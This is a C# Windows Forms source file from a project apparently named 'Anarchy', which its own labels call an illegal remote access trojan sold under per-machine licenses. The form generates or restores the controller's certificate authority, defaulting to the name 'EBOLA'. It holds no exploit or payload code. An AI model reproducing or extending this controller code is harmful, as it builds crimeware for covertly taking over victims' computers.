using System;
using System.ComponentModel;
using System.IO;
using System.IO.Compression;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Windows.Forms;
using Anarchy.Auth;
using Anarchy.Helpers;
using Anarchy.Helpers.Helper;
using Guna.UI2.WinForms;
using ReaLTaiizor.Controls;

namespace Anarchy.Forms;

public class FormCertificate : Form
{
    private IContainer components;

    private System.Windows.Forms.GroupBox groupBox1;

    private Label label1;

    private TextBox textBox1;

    private BigLabel bigLabel2;

    private BigLabel bigLabel4;

    private BigLabel bigLabel5;

    private NightButton button1;

    private Guna2Elipse guna2Elipse1;

    private Guna2AnimateWindow guna2AnimateWindow1;

    private PictureBox pictureBox1;

    private Guna2BorderlessForm guna2BorderlessForm1;

    public FormCertificate()
    {
        this.InitializeComponent();
        base.TopMost = true;
    }

    private void FormCertificate_Load(object sender, EventArgs e)
    {
        try
        {
            string text;
            text = Application.StartupPath + "\\BackupCertificate.zip";
            if (File.Exists(text))
            {
                MessageBox.Show(this, "Found a zip backup, Extracting (BackupCertificate.zip)", "Certificate backup", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                ZipFile.ExtractToDirectory(text, Application.StartupPath);
                Settings.ServerCertificate = new X509Certificate2(Settings.CertificatePath);
                base.Close();
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, ex.Message, "Certificate", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        }
    }

    private async void Button1_Click(object sender, EventArgs e)
    {
        try
        {
            if (string.IsNullOrWhiteSpace(this.textBox1.Text))
            {
                return;
            }
            this.button1.Text = "Please wait";
            this.button1.Enabled = false;
            this.textBox1.Enabled = false;
            Exception ex2;
            await Task.Run(delegate
            {
                try
                {
                    string archiveFileName;
                    archiveFileName = Application.StartupPath + "\\BackupCertificate.zip";
                    Settings.ServerCertificate = CreateCertificate.CreateCertificateAuthority(this.textBox1.Text, 1024);
                    File.WriteAllBytes(Settings.CertificatePath, Settings.ServerCertificate.Export(X509ContentType.Pfx));
                    using (ZipArchive destination = ZipFile.Open(archiveFileName, ZipArchiveMode.Create))
                    {
                        destination.CreateEntryFromFile(Settings.CertificatePath, Path.GetFileName(Settings.CertificatePath));
                    }
                    Program.form1.listView1.BeginInvoke((MethodInvoker)delegate
                    {
                        MessageBox.Show(this, "Remember to save the BackupCertificate.zip", "Certificate", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                        base.Close();
                    });
                }
                catch (Exception ex3)
                {
                    ex2 = ex3;
                    Login.form1.listView1.BeginInvoke((MethodInvoker)delegate
                    {
                        MessageBox.Show(this, ex2.Message, "Certificate", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                        this.button1.Text = "OK";
                        this.button1.Enabled = true;
                        this.textBox1.Enabled = true;
                    });
                }
            });
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, ex.Message, "Certificate", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            this.button1.Text = "Ok";
            this.button1.Enabled = true;
        }
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && this.components != null)
        {
            this.components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FormCertificate));
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.textBox1 = new System.Windows.Forms.TextBox();
            this.label1 = new System.Windows.Forms.Label();
            this.bigLabel2 = new ReaLTaiizor.Controls.BigLabel();
            this.bigLabel4 = new ReaLTaiizor.Controls.BigLabel();
            this.bigLabel5 = new ReaLTaiizor.Controls.BigLabel();
            this.button1 = new ReaLTaiizor.Controls.NightButton();
            this.guna2Elipse1 = new Guna.UI2.WinForms.Guna2Elipse(this.components);
            this.guna2AnimateWindow1 = new Guna.UI2.WinForms.Guna2AnimateWindow(this.components);
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(this.components);
            this.groupBox1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.SuspendLayout();
            // 
            // groupBox1
            // 
            this.groupBox1.Controls.Add(this.label1);
            this.groupBox1.Location = new System.Drawing.Point(1081, 388);
            this.groupBox1.Margin = new System.Windows.Forms.Padding(2);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Padding = new System.Windows.Forms.Padding(2);
            this.groupBox1.Size = new System.Drawing.Size(252, 178);
            this.groupBox1.TabIndex = 0;
            this.groupBox1.TabStop = false;
            this.groupBox1.Text = "New Certificate";
            this.groupBox1.Visible = false;
            // 
            // textBox1
            // 
            this.textBox1.Location = new System.Drawing.Point(436, 143);
            this.textBox1.Margin = new System.Windows.Forms.Padding(2);
            this.textBox1.Name = "textBox1";
            this.textBox1.Size = new System.Drawing.Size(86, 20);
            this.textBox1.TabIndex = 1;
            this.textBox1.Text = "EBOLA";
            this.textBox1.Visible = false;
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(84, 40);
            this.label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(64, 13);
            this.label1.TabIndex = 0;
            this.label1.Text = "Sever name";
            // 
            // bigLabel2
            // 
            this.bigLabel2.AutoSize = true;
            this.bigLabel2.BackColor = System.Drawing.Color.Transparent;
            this.bigLabel2.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.bigLabel2.ForeColor = System.Drawing.Color.Red;
            this.bigLabel2.Location = new System.Drawing.Point(3, 118);
            this.bigLabel2.Name = "bigLabel2";
            this.bigLabel2.Size = new System.Drawing.Size(403, 40);
            this.bigLabel2.TabIndex = 2;
            this.bigLabel2.Text = "1. The use of the rat is illegal, you are solely responsible for \r\nthe use of the" +
    " software.";
            // 
            // bigLabel4
            // 
            this.bigLabel4.AutoSize = true;
            this.bigLabel4.BackColor = System.Drawing.Color.Transparent;
            this.bigLabel4.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.bigLabel4.ForeColor = System.Drawing.Color.Red;
            this.bigLabel4.Location = new System.Drawing.Point(1, 165);
            this.bigLabel4.Name = "bigLabel4";
            this.bigLabel4.Size = new System.Drawing.Size(405, 40);
            this.bigLabel4.TabIndex = 4;
            this.bigLabel4.Text = "2. The license is only for one computer, if you need to use it \r\non another compu" +
    "ter you must buy a new license.";
            // 
            // bigLabel5
            // 
            this.bigLabel5.AutoSize = true;
            this.bigLabel5.BackColor = System.Drawing.Color.Transparent;
            this.bigLabel5.Font = new System.Drawing.Font("Segoe UI", 11.25F);
            this.bigLabel5.ForeColor = System.Drawing.Color.Red;
            this.bigLabel5.Location = new System.Drawing.Point(1, 215);
            this.bigLabel5.Name = "bigLabel5";
            this.bigLabel5.Size = new System.Drawing.Size(420, 20);
            this.bigLabel5.TabIndex = 5;
            this.bigLabel5.Text = "3. If you format pc you will lose license and you must buy new.";
            // 
            // button1
            // 
            this.button1.BackColor = System.Drawing.Color.Transparent;
            this.button1.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button1.DialogResult = System.Windows.Forms.DialogResult.None;
            this.button1.Font = new System.Drawing.Font("Segoe UI", 10F);
            this.button1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(242)))), ((int)(((byte)(93)))), ((int)(((byte)(89)))));
            this.button1.HoverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(242)))), ((int)(((byte)(93)))), ((int)(((byte)(89)))));
            this.button1.HoverForeColor = System.Drawing.Color.White;
            this.button1.InterpolationType = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
            this.button1.Location = new System.Drawing.Point(1, 242);
            this.button1.MinimumSize = new System.Drawing.Size(144, 47);
            this.button1.Name = "button1";
            this.button1.NormalBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(242)))), ((int)(((byte)(93)))), ((int)(((byte)(89)))));
            this.button1.PixelOffsetType = System.Drawing.Drawing2D.PixelOffsetMode.HighQuality;
            this.button1.PressedBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(100)))), ((int)(((byte)(242)))), ((int)(((byte)(93)))), ((int)(((byte)(89)))));
            this.button1.PressedForeColor = System.Drawing.Color.White;
            this.button1.Radius = 20;
            this.button1.Size = new System.Drawing.Size(416, 47);
            this.button1.SmoothingType = System.Drawing.Drawing2D.SmoothingMode.AntiAlias;
            this.button1.TabIndex = 6;
            this.button1.Text = "Continue >";
            this.button1.Click += new System.EventHandler(this.Button1_Click);
            // 
            // guna2Elipse1
            // 
            this.guna2Elipse1.BorderRadius = 11;
            this.guna2Elipse1.TargetControl = this;
            // 
            // pictureBox1
            // 
            this.pictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox1.Image")));
            this.pictureBox1.Location = new System.Drawing.Point(5, 4);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(409, 111);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.AutoSize;
            this.pictureBox1.TabIndex = 7;
            this.pictureBox1.TabStop = false;
            // 
            // guna2BorderlessForm1
            // 
            this.guna2BorderlessForm1.BorderRadius = 6;
            this.guna2BorderlessForm1.ContainerControl = this;
            this.guna2BorderlessForm1.DockIndicatorTransparencyValue = 0.6D;
            this.guna2BorderlessForm1.ShadowColor = System.Drawing.Color.Red;
            this.guna2BorderlessForm1.TransparentWhileDrag = true;
            // 
            // FormCertificate
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.ClientSize = new System.Drawing.Size(418, 295);
            this.ControlBox = false;
            this.Controls.Add(this.textBox1);
            this.Controls.Add(this.pictureBox1);
            this.Controls.Add(this.button1);
            this.Controls.Add(this.bigLabel5);
            this.Controls.Add(this.bigLabel4);
            this.Controls.Add(this.bigLabel2);
            this.Controls.Add(this.groupBox1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Margin = new System.Windows.Forms.Padding(2);
            this.MaximumSize = new System.Drawing.Size(1920, 1080);
            this.MinimumSize = new System.Drawing.Size(126, 50);
            this.Name = "FormCertificate";
            this.ShowIcon = false;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Anarchy";
            this.TransparencyKey = System.Drawing.Color.Fuchsia;
            this.Load += new System.EventHandler(this.FormCertificate_Load);
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

    }
}